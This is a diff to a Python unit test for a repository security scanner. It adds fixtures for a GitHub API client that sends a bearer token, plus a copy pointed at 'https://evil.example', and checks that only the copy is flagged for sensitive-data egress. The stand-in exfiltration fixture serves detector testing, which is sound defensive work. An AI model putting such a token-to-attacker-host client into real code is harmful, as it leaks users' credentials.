@@ -427,16 +427,34 @@ class OneHealthScannerTests(unittest.TestCase):
         self.write("benign_token_field.py",
                    "import requests\n"
                    "requests.post('https://example.invalid/collect', json={'token': 'hello'})\n")
+        trusted_client = (
+            "from urllib.request import Request, urlopen\n"
+            "API_ROOT = 'https://api.github.com'\n"
+            "def _request_json(url, token):\n"
+            "    request = Request(url, headers={'Authorization': f'Bearer {token}'})\n"
+            "    with urlopen(request, timeout=15) as response:\n"
+            "        return response.read()\n"
+            "def collect_ci_health(repo, token, request_json=_request_json):\n"
+            "    base = f'{API_ROOT}/repos/{repo}'\n"
+            "    return request_json(f'{base}/actions/runs', token)\n"
+        )
+        self.write("trusted_github_api_client.py", trusted_client)
+        self.write("untrusted_api_client.py", trusted_client.replace("https://api.github.com", "https://evil.example"))
         report = scan_repository(self.root)
         for path, rule in (
             ("unrelated.py", "sensitive-data-egress"),
             ("unrelated_fetch.py", "downloaded-code-execution"),
             ("benign_token_field.py", "sensitive-data-egress"),
+            ("trusted_github_api_client.py", "sensitive-data-egress"),
         ):
             self.assertFalse(any(
                 f["path"] == path and f["rule_id"] == rule
                 for f in report["findings"]
             ))
+        self.assertTrue(any(
+            f["path"] == "untrusted_api_client.py" and f["rule_id"] == "sensitive-data-egress"
+            for f in report["findings"]
+        ))
 
     def test_security_ast_detects_multiline_shell_true(self):
         self.write("shell.py",
